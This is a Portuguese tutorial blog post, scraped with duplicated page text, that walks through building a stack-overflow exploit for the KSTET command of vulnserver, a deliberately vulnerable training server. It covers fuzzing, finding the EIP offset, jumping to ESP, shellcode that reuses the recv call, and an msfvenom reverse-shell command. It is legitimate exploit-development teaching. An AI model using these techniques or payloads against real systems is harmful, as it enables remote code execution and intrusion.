[lter_value] KSTAN [lstan_value] EXIT [/sourcecode] Enquanto isso em sua console principal a aplicação mostra que ocorreu uma conexão Para o processo de fuzzing vamos utilizar a aplicação spike, como sempre ao conectar no servidor ele retorna essa mensagem de boas vindas temos que informar para o spike ler essa mensagem antes de enviar os comandos desejados. Usando este arquivo do spike (demonstrado acima) iremos realizar o fuzzing na porção kstet_value do comando depois de ler a mensagem de boas vindas. Anexe o vulnserver no Immunity Debugger e execute o comando abaixo: [sourcecode language=&quot;shell&quot;]root@M4v3r1cK:~/vulnserver/exploit2_WS2_32_Recv# generic_send_tcp 172.30.200.66 9999 01-fuzz.spk 0 0 Total Number of Strings is 681 Fuzzing Fuzzing Variable 0:0 line read=Welcome to Vulnerable Server! Enter HELP for help. Fuzzing Variable 0:1 Variablesize= 5004 Fuzzing Variable 0:2 Variablesize= 5005 Fuzzing Variable 0:3 Variablesize= 21 ^C [/sourcecode] Logo na primeira interação (demonstrada abaixo) o vulnserver travou em nosso debug. [sourcecode language=&quot;shell&quot;]Fuzzing Variable 0:1 Variablesize= 5004 [/sourcecode] Observe a saída do spike (demonstrada acima), ela nos diz que fou realizado o fuzzing na primeira variável (como os computadores iniciam em zero, nossa primeira variável é referenciada como 0). No outro lado dos dois pontos, podemos ver que temos a segunda interação do fuzzing representada pelo 1. Na outra linha o spike nos mostrou o tamanho do buffer que ele enviou, neste caso 5004 bytes. Agora podemos ver como isso ficou no Immunity Debugger: Pode-se observar que o spike enviou a requisição conforme abaixo: [sourcecode language=&quot;shell&quot;]KSTET /.:/AAAAAAAAA........ [/sourcecode] Provavelmente 5000 A com o prefixo /.:/ Vamos duplicar este exploit em python criando então uma prova de conceito (PoC) &nbsp; 0x02 - Exploit de PoC Daqui para frente utilizaremos scripts Python para realizar todo nosso processo. Como ja sabemos nosso Overflow ocorreu com 5000 bytes + 4 caracteres /.:/ então vamos reproduzir isso: Executando nosso PoC temos a seguinte saída: [sourcecode language=&quot;shell&quot;]root@M4v3r1cK:~/vulnserver/exploit2_WS2_32_Recv# ./02-poc.py [*] Enviando requisicao maliciosa ... [/sourcecode] E o crash ocorreu: Agora que temos uma prova de conceito funcional, vamos aprofundar e determinar o tipo de overflow (se é uma substituição simples do EIP, SEH e etc...) e em que offset isso ocorre. 0x03 - Determinando o tipo de Exploit e o Offset de controle Olhando na imagem (do immunity Debugger) podemos observar que o registrador EIP foi substituido por: [sourcecode language=&quot;shell&quot;]41414141 [/sourcecode] Se você está lendo nossos posts de forma sequencial ou ja realizou uma outra exploração de Buffer Overflow sabe que A (maiúsculo) corresponde ao hexa 41. Bom! agora sabemos que temos um stacked buffer overflow de simples substituição do EIP, ou também conhecido como vanilla EIP overwrite. Agora precisamos saber em que ponto do nosso 5000 bytes está ocorrendo a substiruição do EIP. Vamos usar uma ferramenta da metasploit para gerar um buffer único e depois identificar em quem ponsto a substituição ocorreu. Gerando o buffer único: [sourcecode language=&quot;shell&quot;]root@M4v3r1cK:~/vulnserver/exploit2_WS2_32_Recv# msf-pattern_create -l 5000 [/sourcecode] Agora basta copiar e colar este buffer em nosso arquivo python conforme demonstrado abaixo: Execute este script e veja como ficou o registrador EIP: Agora basta usar o comando msf-pattern_offset com o valor de EIP para identificar a posição exata do buffer: [sourcecode language=&quot;shell&quot;]root@M4v3r1cK:~/vulnserver/exploit2_WS2_32_Recv# msf-pattern_offset -l 5000 -q 41326341 [*] Exact match at offset 66 [/sourcecode] Isso indica que o EIP inicia no offset 66, ou seja, na posição 66, em outras palavras, temos 66 bytes de caracteres antes do EIP + 4 bytes do EIP e depois o restante do buffer. Vamos atualizar nosso exploit e verificar se temos o offset correto. 0x04 - Verificando o Offset Vamos atualizar nosso exploit PoC com o tamanho do Offset conforme abaixo: E executamos ele obtendo o resultado abaixo: Isso indica que temos um exploit funcional que substituiu o EIP pelos nossos Bs, hexa 0x42, e que o ESP está apontado para o ponto exatamente posterior ao EIP, onde estão nossos Cs. Porém olhando um pouco mais a fundo em nossa pilha de memória podemos ver que temos um numero limitado de Cs mesmo tendo enviado 500, este número é exatamente 20 bytes que pode ser calculado de 2 formas diferentes: Contando: Cada linha tem 4 bytes e no stack temos 5 linhas, então 4*5 = 20 bytes Calculando: endereço inicial do stack 00FEF9F8, o primeiro caractere depois dos C está localizado em 00FEFA0C, então 00FEFA0C - 00FEF9F8 = 20 bytes Mas e dai que só tem 20 bytes? Isso indica que só teremos estes 20 bytes + os 66 bytes (antes do EIP) para realizar todo nosso processo de exploração, e um shellcode pequeno gerado pelo msfvenom tem pelo menos 354 bytes. Então teremos que ser criativos. Nota importante: Cuidado com os próximos passos para não continuar usando o buffer maior que 20 bytes após o endereço do EIP, pois isso causará problemas futuros. 0x05 - Saltando para nosso Buffer O próximo passo em nosso processo de exploração será saltar para os nossos Cs, para isso precisaremos localizar um endereço de memória (sem o nullbyte 0x00) que faça o JMP ESP ou CALL ESP, podemos usar o script Mona para nos ajudar nessa tarefa. Note que vou utlizar o -n para ignorar os endereços iniciados por null byte. [sourcecode language=&quot;shell&quot;]!mona jmp -n -r ESP [/sourcecode] Este comando nos retornou 9 opções Porém a nossa escolha foi a primeira: [sourcecode language=&quot;shell&quot;]Log data, item 11 Address=625011AF Message= 0x625011af : jmp esp | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (essfunc.dll) [/sourcecode] Por hora não conhecemos nenhum badchar, a não ser os classisos para um servidor baseado em comandos ASCII (0x00 - null byte, 0x0d - &#39;\r&#39;, 0x0a - &#39;\n&#39;). Adicionamente este endereço não tem outras proteções como SafeSEH e ASLR e é uma DLL do proprio sistema, o que facilita as coisas pois não corre-se o risco do endereço se alterar com a mudança de sistema operacional. Então vamos atualizar nosso exploit para realizar esse JMP ESP. Nele utilizaremos uma função chamada pack da biblioteca struct para alterar o endereço entre big endian e little endian. Segue nosso exploit atualizado: Antes de rodar nosso exploit novamente, no Immunity Debbuger clique no botão Goto address in Dissassembler demonstrado abaixo: E digite o endereço da instrução JMP ESP escolhida: Se certifique que está no endereço correto pois algumas vezes é necessário fazer este processo mais de uma vez para alcançar o endereço correto. Uma vez no endereço correto pressionne F2 para adicionar um breakpoint. Agora execute o exploit e veja a aplicação parando no breakpoint selecionado Observe que essa parada foi devido ao breakpoint, sabemos isso por causa do texto na barra de status &quot;Breakpoint at essfunc.625011AF&quot; e não outro erro como access violation. Para dar continuidade pressione F7 (Step Into) para permitir o JMP para o endereço do ESP que por sua vez é a localização dos nossos Cs 0x06 - Saltando para o buffer maior Até este ponto conseguimos saltar para o nosso ESP que é um buffer com 20 bytes, que não da p/ fazer quase nada, mas é mais que suficiente para que possamos fazer um salto para traz indo para nossos As que é um buffer um pouco maior (66 bytes) Mas como fazemos isso? Há diversas formas, vamos explorar uma delas aqui, mas para isso precisamos saber onde estamos. Olhando na imagem anterior vemos o seguinte cenário: [sourcecode language=&quot;shell&quot;]00EDF9F8 43 INC EBX [/sourcecode] Estamos no endereço de memória 00EDF9F8. Mas onde está o início dos nossos As? [sourcecode language=&quot;shell&quot;]00EDF9B2 41 INC ECX [/sourcecode] Então podemos fazer alguns cálculos para realizar a movimentação necessária [sourcecode language=&quot;shell&quot;]00EDF9F8 (Localização atual) - 00EDF9B2 (Posição desejada) = Valor em Hexa: 46 ou Valor em Decimal: 70 [/sourcecode] Para realizar os calculos do ESP de forma segura vamos colocar seu valor em EDX: [sourcecode language=&quot;shell&quot;]PUSH ESP POP EDX [/sourcecode] E posteriormente subtrair 0x46 (decimal 70) de seu valor: [sourcecode language=&quot;shell&quot;]SUB EDX,0x46 [/sourcecode] E por fim saltar para o endereço desejado: [sourcecode language=&quot;shell&quot;]JMP EDX [/sourcecode] Caso não esteja familiarizado o mestasploit tem uma ferramenta para nos ajudar neste processo de criação dos OPCODES chamada msf-nasm_shell conforme demonstrado abaixo: [sourcecode language=&quot;shell&quot;]root@M4v3r1cK:~# msf-nasm_shell nasm &amp;amp;amp;amp;gt; PUSH ESP 00000000 54 push esp nasm &amp;amp;amp;amp;gt; SUB EDX,0x46 00000000 83EA46 sub edx,byte +0x46 nasm &amp;amp;amp;amp;gt; JMP EDX 00000000 FFE2 jmp edx nasm &amp;amp;amp;amp;gt; [/sourcecode] Segue abaixo o exploit atualizado: Este é um dos métodos de realizar este processo, e o escolhido por mim neste exploit, porém há métodos mais econômicos do ponto de vista de consumo de espaço uma vez que temos somente 20 bytes. Como por exemplo o JUMP para 72 bytes para traz (70 bytes desejados + 2 consumido pela da instrução de JMP) [sourcecode language=&quot;shell&quot;]root@M4v3r1cK:~# msf-nasm_shell nasm &amp;amp;amp;amp;gt; JMP short -72 00000000 EBB6 jmp short 0xffffffb8 nasm &amp;amp;amp;amp;gt; [/sourcecode] Segue abaixo a segunda opção: Note que como neste nosso exploit nesse primeiro estágio só precisamos realizar o salto para nosso segundo estágio (nossos As) não faz diferença no método utilizado, mas caso precisasse realizar outras operações nestes restritos 20 bytes essa segunda opção certamente seria a melhor opção. Reiniciando o Immunity, redefinindo nosso breakpoint no commando JMP ESP e então pressionando F7 quando a execução parar no breakpoint chegaremos ao resultado abaixo: Neste ponto temos pelo menos 2 formar de continuar com o exploit: Verificando a possibilidade de enviar o shellcode através de outro comando do servidor e buscando essa área de memória com egghunter (este processo é descrito no post Criação de Exploits – Parte 3 – Estudo de caso: vulnserver KSTET com egghunter ) Reutilizando a função WS2_32.recv (que foi a função utilizada para ler nosso buffer inicial) para ler da nossa própria conexão um novo buffer (shellcode) e posteriormente executa-lo. Isso parece meio confuso no início, mas não se preocupe mais a frente explicarei mais detalhadamente este processo. Neste post abordaremos a opção 2: reutilização da função WS2_32.recv. 0x07 - Entendendo a engenharia e utilização da função WS2_32.recv Não existe outra forma melhor de entender o funcionamento deste processo sem entender o que a nossa aplicação está executando, então vamos ao código da aplicação: Analisando o fluxo da aplicação percebemos que a mesma abre um socket na porta especificada, e quando um cliente se conecta é criada uma nova thread que executa a função ConnectionHandler (aproximadamente linha 160) esta é a função responsável por tratar da conexão do cliente. Indo mais a fundo dentro dessa função, depois da conexão estabelecida a aplicação entre em um loop para tratar as requisições vindas do cliente e dentro do loop chama a função recv que é responsável por receber s dados vindos do nosso cliente através do socket. Bom, como a função WS2_32.recv funciona? Se olharmos na documentação do MSDN (localizada aqui) podemos ver o seguinte: [sourcecode language=&quot;c&quot;]int recv( SOCKET s, char *buf, int len, int flags ); [/sourcecode] Sendo assim a função recv recebe 4 parâmetros sendo eles: SOCKET s: file descriptor do socket da conexão do cliente; char *buf: ponteiro de memória do buffer para o qual os dados serão recebidos e copiados; int len: tamanho dos dados a serem recebidos do socket; int flags: as flags influenciam no comportamento da função, para nosso estudo podemos ignorar estes parâmetro. Continuando na análise do nosso código vemos que a função WS2_32.recv (em nosso código) é chamada conforme abaixo: [sourcecode language=&quot;c&quot;]Result = recv(Client, RecvBuf, RecvBufLen, 0); [/sourcecode] O que vamos colocar como foco é o parâmetro RecvBufLen que um pouco antes é definido como: [sourcecode language=&quot;c&quot;]int RecvBufLen = DEFAULT_BUFLEN; [/sourcecode] Que por sua vez a variável estática DEFAULT_BUFLEN fou definida anteriormente como: [sourcecode language=&quot;c&quot;]#define DEFAULT_BUFLEN 4096 [/sourcecode] Isso indica que nossa aplicação realiza a leitura de 4096 bytes. Afe!!!, não entendi nada mas nosso overflow não está ocorrendo com 66 bytes? Da onde vem esse 4096? Vamos continuar a análise que espero explicar isso. Extraindo a sessão de código que trata do nosso comando vulnerável KSTET temos o seguinte código: [sourcecode language=&quot;c&quot;]} else if (strncmp(RecvBuf, &quot;KSTET &quot;, 6) == 0) { char *KstetBuf = malloc(100); strncpy(KstetBuf, RecvBuf, 100); memset(RecvBuf, 0, DEFAULT_BUFLEN); Function2(KstetBuf); SendResult = send( Client, &quot;KSTET SUCCESSFUL\n&quot;, 17, 0 ); } [/sourcecode] Vamos estudar linha a linha: char *KstetBuf = malloc(100): cria a variável KstetBuf e aloca uma espaço de memória de 100 bytes para ela; strncpy(KstetBuf, RecvBuf, 100): copia os 100 primeiros bytes do buffer recebido pelo socket para essa variável recem criada KstetBuf ; memset(RecvBuf, 0, DEFAULT_BUFLEN): preenche todo o buffer (variável RecvBuf) com zeros; Function2(KstetBuf): chama a função Function2 passando como parâmetro a variável KstetBuf que por sua vez detem 100 bytes; Até ai tudo OK, sem nenhuma vulnerabilidade e nhum problema, agora vamos analisar o código da função chamada Function2 conforme abaixo: [sourcecode language=&quot;c&quot;]void Function2(char *Input) { char Buffer2S[60]; strcpy(Buffer2S, Input); } [/sourcecode] Mais uma vez vamos a análise linha a linha: char Buffer2S[60]: cria uma variável com tamanho fixo de 60 bytes; strcpy(Buffer2S, Input): realiza a copia do parâmetro recebido, de nome Input. Nesta sessão podemos perceber a vulnerabilidade no strcpy onde se tenta copiar os 100 bytes passados como parâmetro para dentro de um buffer de 60 bytes. Sendo assim novo overflow consiste em controlar o fluxo da aplicação que ao invés dela continuar seu fluxo normal e executar o código SendResult = send( Client, &quot;KSTET SUCCESSFUL\n&quot;, 17, 0 ) a mesma vai saltar para o endereço que desejamos e controlamos no EIP. Isso explica algumas coisas, o buffer de 66 bytes, pois nunca é o tamanho exato do tamanho da variável que houve o overflow (caso tenha duvida ou não esteja muito familiarizado com este processo sugiro a leitura do post que fiz explicando a teoria do buffer overflow Criação de Exploits – Parte 0 – Um pouco de teoria). Explica também porque temos um buffer tão limitado de 20 bytes após o EIP. Até agora entendemos o porque o overflow ocorre, o porque temos um tamanho tão limitado após o EIP, mas ainda não entramos no como utilizaremos a função recv a nosso favor para receber o nosso shellcode. Como vimos a aplicação em seu fluxo normal executa as seuintes operações: Realiza o bind na porta desejada (por padrão 9999); Quando o cliente se conecta chama a função ConnectionHandler em uma nova thread para tratar das requisições do cliente; Dentro da função ConnectionHandler, fica em um loop infinito chamando a função WS2_32.recv para receber os dados do cliente e trata os dados recebidos conforme os IFs; Em nosso comando vulnerável (KSTET) chama a função de nome Function2; Depois retorna dados para o cliente; O que pretendemos fazer é alterar este fluxo que depois do nosso crash possamos chamar de forma deliberada a função recv lendo um novo buffer de nosso cliente, só que dessa vez sem os limitadores impostos pela aplicação, pois nós que definiremos o tamanho do buffer, e mandando que o recv escreva os novos dados recebidos (que será nosso shellcode) em uma área estratégica para que possamos executa-lo. Basicamente temos a seguinte anatomia após o nosso overflow: 66 bytes: que será nosso segundo estágio 4 bytes: endereço do EIP 20 bytes: stagio1 que fará o JUMP para o segundo estágio Dentro do segundo estágio (66 bytes) nos vamos chamar a função WS2_32.recv para que ela leia do nosso socket mais 520 bytes e o grave no endereço de memória antes do final dos 66 bytes para que após a leitura destes dados possamos executar o nosso shellcode. Vamos dar uma olhada na imagem abaixo logo antes da chamada da função recv Note que a proxima instrução a ser executada é a CALL EAX e que EAX detém o endereço de memória da função WS2_32.recv, e na pilha para a chamada da função tem-se 4 parâmetros conforme abaixo: Socket = 0x50: Nosso file descripto do socket do cliente; Buffer = 0x00E2F9F0: Endereço de memória onde será gravado os dados recebidos pelo socket; BufSize = 0x0208 (Decimal 520): Tamanho do buffer que deve ser lido; Flags = 0: Podemos ignorar. Sendo assim observe que coloquei estratégicamente o endereço onde será gravado os novos dados recebidos para logo depois da minha posição atual de execução, sendo assim após a chamada da função WS2_32.recv continua-se a execução até chegar no shellcode. Agora observer abaixo logo após a chamada da função recv, para efeitos didáticos o shellcode que passei são 520 E que tem hexa 0x45 Do ponto de vista do meu código foi chamado da seguinte forma: [sourcecode language=&quot;python&quot;]#!/usr/bin/python # -*- coding: utf-8 -*- ... ... ... exp.send(buffer) sleep(1) shellcode = &quot;E&quot; * 520 exp.send(shellcode) [/sourcecode] Onde a variável buffer detém todo o código para fazer o buffer overflow e a chamada da função recv (veremos esse código mais a frente) e a variável shellcode são 520 Es &nbsp; 0x08 - Encontrando a função WS2_32.recv Agora que sabemos que iremos usar a função WS2_32.recv precisamos encontra-la em nosso código, o que sabemos é que ela ja foi usada em nossa aplicação, sendo assim ela estará em nossa IAT (Import Address Table) e em algum lugar da nossa aplicação. Para localiza-la reinicie o Immunity Debbuger, anexe a aplicação e no painel superior esquerdo clique com o botão direito do mouse e clique em View &gt; Module &#39;vulnserv&#39;, caso a opção Module &#39;vulnserv&#39; não apareça é porque você ja está neste módulo, se isso for verdade na barra de titulo você verá algo como &#39;module vulnserv&#39;. Agora no painel superior esquerdo clique com o botão direito do mouse e clique em Search for &gt; All intermodular calls Este processo nos mostrara a lista de todas as chamadas para outros módulos. Vamos clicar no cabeçalho na coluna &#39;Destination&#39; para ordenar por nome. É importante notar que a ordenação ocorrerá por nome da função não por módulo. Por exemplo, WS2_32.bind e WS2_32.recv serão ordenadas nas palavras bind e recv respectivamente. Após a ordenação podemos facilmente localizar a chamada para a recv, após localizado a selecione e pressione F2 para adicionar um breakpoint. Você verá que a instrução ficará marcada conforme a a imagem abaixo: Após adicionar o breakkpoint clique com o botão direito e clique em Follow in Disassembler Indo para a chamada da função WS2_32.recv Para localizar o nosso file descritor do socket, vamos alterar nosso exploit substituindo os As do nosso buffer por 0xCC que é um breakpoint. Isso é ara simplificar nosso processo. Quando executado o processo deverá parar no breakpoint do recv Neste ponto podemos observar nossa pilha (stack) os argumentos que estão sendo passados para a função recv. Que fazendo um paralelo com a documentação do MSDN temos os seguintes parâmetros: [sourcecode language=&quot;python&quot;]int recv( SOCKET 0x00000050, char *0x002B3358, int 0x1000, int 0x00000000 ); [/sourcecode] Então nosso file descriptor que tanto desejamos é 0x00000050. Vamos permitir a execução da nossa aplicação pressionando F9 (pode ser que precise reiniciar a aplicação e o immunity e retirar o breakpoint da função recv pois algumas vezes o sistema não permite dar continuidade na execução, se isso ocorrer reinicie o immunity e anexe novamente a aplicação e rode o exploit novamente). Nota de endereço: Neste ponto de pressionarmos mais uma vez o F7 iremos para a tela abaixo onde será apresentado o endereço da chamada da WS2_32.recv em nossa IAT (Import Address Table), anote este endereço pois utilizaremos bem mais a frente. 0x09 - Encontrando o file descriptor Uma vez encontrado o valor do file descriptor agora precisamos encontrar onde o valor do mesmo está armazenado e qual a relação e distância na pilha ele está da nossa posição atual. Com nosso exploit parado no primeiro 0xCC no painel esquero superior clique com o botão direito do mouse e clique em Search for &gt; Binary String Então procure pelo valor do file descriptor (em nosso caso 0x00000050) Quando fazemos isso, podemos buscar as outras opções pressionando CTRL + L. No nosso ambiente encontramos as seguintes opções Escolhi a primeira opção [sourcecode language=&quot;c&quot;]00FAF8B1 0000 ADD BYTE PTR DS:[EAX],AL 00FAF8B3 0050 00 ADD BYTE PTR DS:[EAX],DL 00FAF8B6 0000 ADD BYTE PTR DS:[EAX],AL 00FAF8B8 0000 ADD BYTE PTR DS:[EAX],AL 00FAF8BA 0000 ADD BYTE PTR DS:[EAX],AL [/sourcecode] Quando nós alcançamos a função recv pela primeira vez a pilha de memória estava na posição [sourcecode language=&quot;c&quot;]00FAF9F8 [/sourcecode] Baseado nessas informações podemos calcular a distancia entre a posição atual da pilha e o endereço atual [sourcecode language=&quot;c&quot;]0x00F7F9F8 (Endereço desejado) - 0x00F7F8B1 (ESP) = Hex: 0x0147 ou Decimal: 327 [/sourcecode] Sendo assim vamos começar a escrita do nosso segundo estágio do exploit [sourcecode language=&quot;c&quot;]PUSH ESP ; Armazena a posição atual de ESP na pilha POP ECX ; Retira o valor da pilha e o coloca em ECX SUB CX,0x147 ; Subtrai 0x147 de ECX [/sourcecode] Usando o msf-nasm_shell para nos ajudar nessa tarefa [sourcecode language=&quot;c&quot;]root@M4v3r1cK:~# msf-nasm_shell nasm &amp;amp;gt; push esp 00000000 54 push esp nasm &amp;amp;gt; pop ecx 00000000 59 pop ecx nasm &amp;amp;gt; sub cx,0x147 00000000 6681E94701 sub cx,0x147 nasm &amp;amp;gt; [/sourcecode] O exploit ficou assim: Ao executa-lo temos o ECX apontando exatamente para a posição de memória que contém o endereço do file descriptor: Em um mundo perfeito isso estaria certo, mas como logo a frente iremos resgatar este valor usando a chamada PUSH DWORD PTR DS:[ECX], vamos executa-la agora apenas para ver o que acontece. Podemos ver que o valor inserido na pilha foi 0x50000000 e não 0x00000050 como o esperado, isso ocorre devido ao endianess, sendo assim precisamos alterar nosso exploit para subtrair 3 bytes a menos sendo 0x144 ao invés de 0x147, ficando assim: 0x0a - Chamando WS2_32.recv Com nosso file descriptor podemos calcular/montar os outros 3 parametros necessários para a chamada da função WS2_32.recv. Retomando como deve ser a chamada da função, como visto anteriormente, os valores devem ser similares a estes (segund p padrão da documentação do MSDN): [sourcecode language=&quot;c&quot;]int recv( SOCKET 0x00000050, char *0x002B3358, int 0x1000, int 0x00000000 ); [/sourcecode] Conforme visto e certificado na imagem abaixo: Como colocaremos os valores diretamente na pilha devemos lembrar que o empilhamento deve ocorrer de forma inversa (caso tenha dúvidas deste funcionamento veja nosso post Criação de Exploits – Parte 0 – Um pouco de teoria onde explico o funcionamento da pilha e outas coisas mais), sendo assim o primeiro item a ser empilhado é o quarto parâmetro (flags), para posteriormente o tamanho do buffer, a localização da memória a ser utilizada como buffer e por fim o file descriptor (valor este qe ja temos armazenado em ECX) Outro ponto importante que devemos observar é que conforme realizamos um empilhamento, ou seja PUSH, o endereço da pilha vai subtraindo e conforme observado na imagem abaixo o endereço da nossa pilha está localizado ligeiramente abaixo do nosso buffer, isso faz com que cada valor que vamos colocar na pilha reduz mais o nosso restruto espaço de 66 bytes, sendo assim nossa primeira preoocupação antes de colocar os valores na pilha é alterar a posição da pilha para contornar este problema. Então nada que jogar a pilha para 80 bytes a menos não resolva [sourcecode language=&quot;c&quot;]SUB ESP, 0X50 [/sourcecode] Vamos agora tratar o primeiro parametro a ser empilhado (4 argumento da função recv) que é a flag que necessita ter valor 0x00 como 0x00 é um null byte e não podemos usar em nosso exploit vamos usar a técnica do XOR: [sourcecode language=&quot;c&quot;]XOR EAX,EAX ; Zera eax PUSH EAX ; Coloca EAX na pilha [/sourcecode] O segundo valor a ser empilhado (3 argumento da função recv) é o tamanho do buffer, que em nosso caso escolhi 520 (hexa 0x0208) em virtude de uma questão estratégica de não usar o null byte neste processo. Nesta atribuição iremos usar alguns recursos do assembly que nos permite atribuir diretamente algumas partes do nosso registrador, para facilitar o entendimento de uma olhada na imagem abaixo: Representado com os valores que desejamos abaixo: [sourcecode language=&quot;c&quot;]+----------------------+ | | EAX | |32 bits | 00 00 02 08 | +--------|-------------+ | | AX | |16 bits | 02 08 | +--------|-------------+ | | AH AL | |8 bits | 02 08 | +----------------------+ [/sourcecode] Sendo assim podemos atribuir da seguinte forma: [sourcecode language=&quot;c&quot;]XOR EAX,EAX ; Zera eax MOV AL,0x08 ; Coloca 0x08 em AL MOV AH,0x02 ; Coloca 0x02 em AH PUSH EAX ; Coloca EAX na pilha [/sourcecode] Agora vamos para o terceiro valor a ser empilhado (segundo parâmetro da função recv) que é o endereço de memória onde deve-se gravar o que for recebido pelo socket do cliente. Como sabemos que nosso ESP foi deslocado 80 bytes e que antes do deslocamento ele estava ligeiramente abaixo do nosso restrito espaço de 66 bytes vamos usar o mesmo parâmetro de calculo para estimar a posição onde deve ser gravado os dados lidos pelo socket: [sourcecode language=&quot;c&quot;]PUSH ESP ; Armazena a posição atual de ESP na pilha POP EDX ; Retira o valor da pilha e o coloca em EDX ADD EDX, 50 ; Adiciona 80 bytes (hexa 0x50) ao registrador EDX PUSH EDX ; Coloca EDX na pilha [/sourcecode] Por fim vamos colocar na pilha o valor do nosso file descriptor (enteriormente calculado) [sourcecode language=&quot;c&quot;]PUSH DWORD PTR DS:[ECX] ; Coloca na pilha o valor que existe no endereço de memória do ECX [/sourcecode] No final deste processo temos o código abaixo: E ao executa-lo o seguinte resultado: Fazendo nosso paralelo com a documentação MSDN temos os valores abaixo, lembrando que o endereço de memória é dinâmico, então se altera a cada execução [sourcecode language=&quot;c&quot;]int recv( SOCKET 0x00000050, char *0x00FEF9F0, int 0x00000208, int 0x00000000 ); [/sourcecode] Agora temos todos os parâmetros necessários para chamar a função WS2_32.recv, existem diversos métodos para chamar a função, utilizaremos um deles e ao meu ver o mais seguro deles. Mas antes disso precisamos saber qual é o endereço, creio que você se lembre daquele endereço que colocamos o breakpoint e eu falei p/ anotar que usariamos mais a frente? Não? Nessas alturas do campeonato, com tanta coisa eu também não lembraria, nós falamos dele no ítem 0x08, mas para facilitar o trabalho segue ele abaixo: [sourcecode language=&quot;c&quot;]0x0040252c [/sourcecode] Para coloca-lo na pilha vamos adiciona-lo em EAX e depois fazer um CALL EAX, mas ai temos um desafio, o endereço começa com ox00 que é um null byte, então o que fazemos? Sempre temos alguma carta na manga. Neste caso vamos colocar o valor deslocado 8 bits para a esquerda, e depois fazer o deslocamente para a direita. Simples né? Não, então vamos entender, supondo que tenhamos o valor abaixo: [sourcecode language=&quot;c&quot;]+----------------------+ | | EAX | |32 bits | 40 25 2c 11 | +--------|-------------+ [/sourcecode] Ao realizar o deslocamento dele 8 bits para a direita ele passará a ter o seguinte valor: [sourcecode language=&quot;c&quot;]+----------------------+ | | EAX | |32 bits | 00 40 25 2c | +--------|-------------+ [/sourcecode] Que é exatamente o que queremos, e para fazer isso em asembly usamos a instrução shr ficando assim: [sourcecode language=&quot;c&quot;]MOV EAX,0x40252c11 ; Atribui o valor 0x40252c11 em EAX SHR EAX,BYTE 0x8 ; Faz o deslocamento de 8 bits para a direita [/sourcecode] E por fim fazemos o call de EAX [sourcecode language=&quot;c&quot;]CALL EAX [/sourcecode] Antes de executar nosso exploit para o teste necessitamos criar 520 bytes para ser o shellcode bem como fazer o envio dele pelo socket ficando então nosso código como o abaixo: Ao executa-lo temos o seguinte cenário: Antes da chamada do CALL EAX Mais uma vez fazendo o paralelo com a documentação do MSDN temos os seguintes valores: [sourcecode language=&quot;c&quot;]int recv( SOCKET 0x00000050, char *0x00FEF9F0, int 0x00000208, int 0x00000000 ); [/sourcecode] Note que o endereço de memória 00FEF9F0 tem alguns NOPs seguido de outros códigos que logo depois da chamada do CALL EAX são inteiramente substituidos pelo nosso pseudo shellcode (0x45) &nbsp; 0x0b - Aproveite o shell Com tudo pronto basta alterar a variável do shellcode dentro do nosso exploit pelos shellcode desejado e seja feliz [sourcecode language=&quot;shell&quot;]msfvenom -p windows/shell_reverse_tcp lhost=192.168.15.177 lport=4444 -a x86 --platform win -b &quot;\x00&quot; -f python [/sourcecode]" /><link rel="canonical" href="https://www.helviojunior.com.br/it/security/criacao-de-exploits/criacao-de-exploits-parte-4-estudo-de-caso-vulnserver-kstet-com-reaproveitamento-da-funcao-ws2_32-recv/" /><meta property="og:url" content="https://www.helviojunior.com.br/it/security/criacao-de-exploits/criacao-de-exploits-parte-4-estudo-de-caso-vulnserver-kstet-com-reaproveitamento-da-funcao-ws2_32-recv/" /><meta property="og:site_name" content="Helvio Junior" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2019-02-17T08:00:33-03:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Criação de Exploits - Parte 4 - Estudo de caso: vulnserver KSTET com reaproveitamento da função WS2_32 Recv" /><meta name="twitter:site" content="@helvioju" /><meta name="twitter:creator" content="@Helvio Junior (m4v3r1ck)" /><meta name="google-site-verification" content="JR4IIP9jfvOwxn2ybV_Qn0SrtDPlTrKomdPWgBuP55k"" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Helvio Junior (m4v3r1ck)"},"dateModified":"2023-08-17T00:19:29-03:00","datePublished":"2019-02-17T08:00:33-03:00","description":"Ola pessoal, Neste post vamos dar continuidade a nossa análise de caso do Vulnserver KSTET. Como característica este servidor é vulnerável a stack buffer overflow mas com um buffer extremamente pequeno, 66 bytes. Sendo assim no post anterior (Criação de Exploits – Parte 3 – Estudo de caso: vulnserver KSTET com egghunter ) fizemos a exploração deste mesmo server com egghunter e neste iremos explorar a reutilização da função WS2_32.recv para reler do nosso socket o shellcode e executa-lo. Antes de dar continuidade eu gostaria de dar os créditos ao autor que me inspirou a criar este post Kevin Kirsche, segue abaixo o link do post original: https://deceiveyour.team/2018/10/15/vulnserver-kstet-ws2_32-recv-function-re-use/ O Exploit 0x01 - Fuzzing Antes de mais nada precisamos encontrar a nossa vulnerabilidade. Para isso vamos realizar um processo de fuzzing em cima do vulnserver. Antes de iniciar o fuzzing, vamos conhecer um pouco mais da aplicação. Ao conectar na aplicação ela nos mostra uma mensagem de boas vindas e sugerindo a execução do comando HELP. [sourcecode language=&quot;shell&quot;]# nc 172.30.200.66 9999 Welcome to Vulnerable Server! Enter HELP for help. [/sourcecode] Ao executar o comando HELP a aplicação nos retorna os comandos disponíveis [sourcecode language=&quot;shell&quot;]# nc 172.30.200.66 9999 Welcome to Vulnerable Server! Enter HELP for help. HELP Valid Commands: HELP STATS [stat_value] RTIME [rtime_value] LTIME [ltime_value] SRUN [srun_value] TRUN [trun_value] GMON [gmon_value] GDOG [gdog_value] KSTET [kstet_value] GTER [gter_value] HTER [hter_value] LTER [lter_value] KSTAN [lstan_value] EXIT [/sourcecode] Enquanto isso em sua console principal a aplicação mostra que ocorreu uma conexão Para o processo de fuzzing vamos utilizar a aplicação spike, como sempre ao conectar no servidor ele retorna essa mensagem de boas vindas temos que informar para o spike ler essa mensagem antes de enviar os comandos desejados. Usando este arquivo do spike (demonstrado acima) iremos realizar o fuzzing na porção kstet_value do comando depois de ler a mensagem de boas vindas. Anexe o vulnserver no Immunity Debugger e execute o comando abaixo: [sourcecode language=&quot;shell&quot;]root@M4v3r1cK:~/vulnserver/exploit2_WS2_32_Recv# generic_send_tcp 172.30.200.66 9999 01-fuzz.spk 0 0 Total Number of Strings is 681 Fuzzing Fuzzing Variable 0:0 line read=Welcome to Vulnerable Server! Enter HELP for help. Fuzzing 